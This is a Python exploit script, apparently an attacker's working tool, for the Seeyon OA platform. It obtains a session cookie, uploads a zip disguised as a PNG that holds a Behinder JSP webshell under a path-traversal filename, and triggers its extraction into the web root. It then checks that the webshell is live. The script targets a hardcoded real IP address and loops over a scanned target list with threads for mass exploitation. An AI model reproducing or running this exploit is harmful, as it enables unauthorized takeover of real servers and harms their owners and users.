import time
import requests
import re
import sys
import random
import zipfile


la = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
           'Content-Type': 'application/x-www-form-urlencoded'}

def generate_random_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str

mm = generate_random_str(8)

webshell_name1 = 'mikes'+'.jsp'
webshell_name2 = '../'+webshell_name1

def file_zip():
    with open(r'S:\Tools\Apt_Tools\Tools\Webshell\菜刀架\Behinder\Behinder_v4.0.6\server\shell.jsp', 'r',encoding='utf8') as f:
        shell=f.read()
  ## 替换shell内容
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('layout.xml', "")
    zf.writestr(webshell_name2, shell)
proxies={
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def Seeyon_Getshell(urllist,index):

    url = urllist+'/seeyon/thirdpartyController.do'
    post = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    response = requests.post(url=url, data=post, headers=la)
    if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
        cookie = response.cookies
        cookies = requests.utils.dict_from_cookiejar(cookie)
        jsessionid = cookies['JSESSIONID']
        file_zip()
        print( '获取cookie成功---->> '+jsessionid)
        fileurl = urllist+'/seeyon/fileUpload.do?method=processUpload&maxSize='
        headersfile = {'Cookie': "JSESSIONID=%s" % jsessionid}
        post = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0',
                'isEncrypt': "0"}
        file = [('file1', ('test.png', open(mm+'.zip', 'rb'), 'image/png'))]
        filego = requests.post(url=fileurl,data=post,files=file, headers=headersfile)
        time.sleep(2)
    else:
        print('获取cookie失败')
        exit()
    if filego.text:
        fileid1 = re.findall('fileurls=fileurls\+","\+\'(.+)\'', filego.text, re.I)
        fileid = fileid1[0]
        if len(fileid1) == 0:
            print('未获取到文件id可能上传失败！')
        print('上传成功文件id为---->>:'+fileid)
        Date_time = time.strftime('%Y-%m-%d')
        headersfile2 = {'Content-Type': 'application/x-www-form-urlencoded','Cookie': "JSESSIONID=%s" % jsessionid}
        getshellurl = urllist+'/seeyon/ajax.do'
        data = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + Date_time + '%22%2C%22' + fileid + '%22%5D'
        getshell = requests.post(url=getshellurl,data=data,headers=headersfile2)
        time.sleep(1)
        webshellurl1 = urllist + '/seeyon/common/designer/pageLayout/' + webshell_name1
        shelllist = requests.get(url=webshellurl1)
        if shelllist.status_code == 200:
            print('利用成功webshell地址：'+webshellurl1)
        else:
            print('未找到webshell利用失败')



import requests,threading,os,urllib3
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#fofa: 
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',
}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'

url='https://117.187.201.89/'
Seeyon_Getshell(url,1)


threads = []
with open(r'D:\BaiduNetdiskDownload\Little_Tools\my_nuclei_template\OA\致远\session_result.txt', 'r') as file:
    # with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 20
        end = start+20

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=Seeyon_Getshell, args=(ip, index,))
            threads.append(thread)
pool_size = 15
# print(urls)

test = 'mt'

if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(Seeyon_Getshell, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()